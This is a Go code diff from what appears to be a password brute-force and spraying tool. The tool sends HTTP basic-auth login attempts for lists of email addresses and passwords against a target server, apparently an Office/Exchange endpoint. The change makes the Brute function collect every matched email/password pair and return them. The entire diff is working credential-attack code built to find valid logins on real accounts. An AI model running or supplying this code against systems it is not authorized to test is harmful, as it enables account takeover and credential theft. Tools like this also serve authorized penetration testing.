@@ -11,10 +11,12 @@ import (
 )
 
 // Brute will bruteforce or spray passwords on the specified users.
-func (options *Options) Brute() {
+func (options *Options) Brute() []string {
 	log = options.Log
 	var emailList []string
 	var wg sync.WaitGroup
+	var validUsers []string
+	mux := &sync.Mutex{}
 	if options.CheckIfValid {
 		optionsEnum := *options
 		// Use office for enumeration
@@ -50,6 +52,9 @@ func (options *Options) Brute() {
 				if options.NoBruteforce {
 					if webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+email, passwordList[j], tr) == 200 {
 						log.Success(email + " / " + passwordList[j] + " matched")
+						mux.Lock()
+						validUsers = append(validUsers, email+" / "+passwordList[j])
+						mux.Unlock()
 
 					} else {
 						log.Fail(email + " / " + passwordList[j] + " does not matched")
@@ -59,6 +64,9 @@ func (options *Options) Brute() {
 					for _, password := range passwordList {
 						if webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+email, password, tr) == 200 {
 							log.Success(email + " / " + password + " matched")
+							mux.Lock()
+							validUsers = append(validUsers, email+" / "+password)
+							mux.Unlock()
 							break // No need to continue if password is valid
 						}
 						log.Fail(email + " / " + password + " does not matched")
@@ -81,5 +89,6 @@ func (options *Options) Brute() {
 
 	close(queue)
 	wg.Wait()
+	return validUsers
 
 }
